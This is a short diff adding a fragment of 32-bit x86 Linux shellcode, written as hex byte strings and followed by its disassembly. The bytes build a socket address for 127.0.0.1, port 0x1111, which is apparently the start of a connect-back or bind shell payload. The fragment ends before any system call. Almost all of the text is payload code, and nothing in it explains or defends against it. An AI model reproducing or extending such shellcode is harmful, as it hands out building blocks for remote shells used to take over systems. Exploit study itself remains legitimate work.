@@ -1,0 +1,21 @@
+"\x31\xc0" 
+"\x50"
+"\x50"
+"\x68\x7f\x00\x00\x01"
+"\x66\x68\x11\x11"
+"\xb0\x02"
+"\x66\x50"
+"\x89\xe0"
+
+
+Disassembly of section .text:
+
+08048054 <_start>:
+ 8048054:	31 c0                	xor    %eax,%eax
+ 8048056:	50                   	push   %eax
+ 8048057:	50                   	push   %eax
+ 8048058:	68 7f 00 00 01       	push   $0x100007f   	#ip = 0x100007f = 127.0.0.1
+ 804805d:	66 68 11 11          	pushw  $0x1111		#port = 0x1111
+ 8048061:	b0 02                	mov    $0x2,%al		#AF_INET
+ 8048063:	66 50                	pushw  %ax
+ 8048065:	89 e0                	mov    %esp,%eax
